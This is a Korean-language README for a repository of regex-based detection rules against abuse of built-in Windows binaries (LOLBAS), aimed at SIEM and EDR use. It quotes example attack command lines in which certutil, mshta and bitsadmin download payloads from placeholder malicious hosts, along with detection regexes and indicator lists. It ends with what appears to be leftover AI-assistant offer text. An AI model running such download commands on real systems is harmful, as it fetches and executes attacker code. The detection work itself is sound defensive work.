# SecureOS LOLBAS 탐지 규칙

이 저장소는 **LOLBAS (Living-Off-the-Land Binaries and Scripts)** 악용을 탐지하기 위한 **정규식 기반 탐지 정책**을 기능별로 정리한 것입니다.

Windows에 기본 포함된 실행 파일을 악용하는 공격을 탐지하기 위해  
**Command Line 기반 탐지 규칙**을 체계적으로 관리하는 것을 목표로 합니다.

이 규칙들은 다음 환경에서 활용할 수 있습니다.

* EDR / XDR 탐지
* SIEM Command Line 모니터링
* Secure OS 보안 강화
* LOLBAS 악용 탐지
* Threat Hunting

---

# 저장소 구조

```text
secureos/
 └─ lolbas/
     └─ functions/
         ├─ download/
         ├─ execute/
         ├─ persistence/
         ├─ recon/
         ├─ remote/
         ├─ script/
         ├─ tunnel/
         ├─ lolbas_function_regrouping.md
         └─ wdac.md
```

각 디렉토리는 **LOLBAS 기능(Function) 기반 탐지 정책**을 포함합니다.

---

# 기능(Function) 분류

LOLBAS 도구들은 운영 환경에서 탐지 및 정책 적용을 쉽게 하기 위해
다음 **7개의 기능 그룹**으로 재분류되었습니다.

| 기능              | 설명                                  |
| --------------- | ----------------------------------- |
| **Download**    | 외부에서 파일을 다운로드 할 수 있는 도구             |
| **Execute**     | 명령, DLL, 프로그램을 실행할 수 있는 도구          |
| **Script**      | 스크립트를 실행할 수 있는 도구                   |
| **Remote**      | 원격 실행 또는 원격 관리 기능                   |
| **Tunnel**      | Reverse Tunnel / Port Forwarding 기능 |
| **Persistence** | 시스템에 지속성을 설정할 수 있는 도구               |
| **Recon**       | 시스템 정보 수집 및 정찰 도구                   |

---

# 탐지 방식

탐지는 **Command Line 패턴 기반**으로 수행됩니다.

기본 탐지 구조

```text
실행파일명 + URL / UNC 경로 / 의심 옵션
```

예시

```text
hh.exe https://example.com/payload.hta
certutil.exe -urlcache -f http://malicious/payload.exe
mshta.exe http://malicious/script.hta
bitsadmin /transfer job http://malicious/file.exe
```

정규식 탐지는 다음 패턴을 탐지합니다.

* URL 기반 파일 다운로드
* UNC 경로 기반 실행
* Base64 인코딩 명령 실행
* LOLBAS 악용 명령 패턴

---

# 정규식 탐지 전략

탐지 정책은 **3단계 구조**로 설계됩니다.

### 1단계 : LOLBAS 실행 탐지

의심스러운 실행 파일을 탐지합니다.

예시

```regex
(?i)\b(mshta|certutil|bitsadmin|wmic|powershell|rundll32)\b
```

---

### 2단계 : Command Line Indicator

의심스러운 옵션 또는 경로를 탐지합니다.

예시

```text
http://
https://
ftp://
\\server\share
-base64
-enc
-urlcache
```

---

### 3단계 : Context 기반 탐지

다음 이벤트를 함께 분석하면 탐지 정확도가 높아집니다.

* Command Line
* Parent Process
* Network Activity
* File Creation

---

# 탐지 정책 형식

각 탐지 정책은 다음 구조로 작성됩니다.

| 항목          | 설명           |
| ----------- | ------------ |
| No          | 규칙 번호        |
| Tool        | LOLBAS 실행 파일 |
| Group       | 기능 그룹        |
| Regex       | 탐지 정규식       |
| FP Notes    | 오탐 가능성       |
| FN Notes    | 우회 가능성       |
| Policy Name | 권장 탐지 정책 이름  |

---

# 탐지 규칙 예시

### mshta 원격 스크립트 실행 탐지

```regex
(?i)\bmshta(?:\.exe)?\b\s+(https?:\/\/[^\s]+)
```

---

### certutil 다운로드 탐지

```regex
(?i)\bcertutil(?:\.exe)?\b.*?-urlcache.*?(https?:\/\/[^\s]+)
```

---

# 운영 환경 적용 권장

다음 로그와 함께 사용하면 효과적인 탐지가 가능합니다.

### Windows 기본 로그

Event ID

```text
4688
```

### Sysmon 로그

Event ID

```text
1
```

추가적으로 다음 이벤트도 활용 가능합니다.

* Network connection
* File creation
* Parent-child process

---

# 적용 가능한 보안 시스템

이 규칙은 다음 보안 시스템에서 활용할 수 있습니다.

* SIEM
* EDR
* XDR
* Sigma Rules
* PLURA 탐지 정책
* Threat Hunting 도구

---

# WDAC 정책 연동

이 저장소에는 WDAC 정책 설계 문서도 포함되어 있습니다.

```text
wdac.md
```

WDAC 정책을 통해 다음과 같은 보안 정책을 적용할 수 있습니다.

* LOLBAS 실행 제한
* 허용/차단 정책
* Secure OS 보안 강화

---

# 참고 자료

LOLBAS Project

[https://lolbas-project.github.io/](https://lolbas-project.github.io/)

Windows 기본 실행 파일을 이용한 공격 기법을 정리한 프로젝트입니다.

---

# Secure OS 목표

이 저장소의 목적은 **Secure OS 보안 아키텍처를 지원하는 것**입니다.

핵심 목표

* LOLBAS 공격 표면 감소
* Windows 기본 도구 악용 탐지
* Threat Hunting 지원
* EDR 탐지 범위 확대
* 체계적인 탐지 정책 관리

---

원하시면 제가 다음도 만들어 드리겠습니다.

* **regex-list.md (전체 정규식 통합 목록)**
* **Top 40 위험 LOLBAS 목록**
* **Sigma Rule 자동 생성**
* **WDAC 차단 정책**
* **LOLBAS 공격 체인 문서**

특히 지금 저장소 구조에서는 **regex-list.md 하나가 매우 중요합니다.**
탐지 정책을 전체적으로 관리하기 좋아집니다.
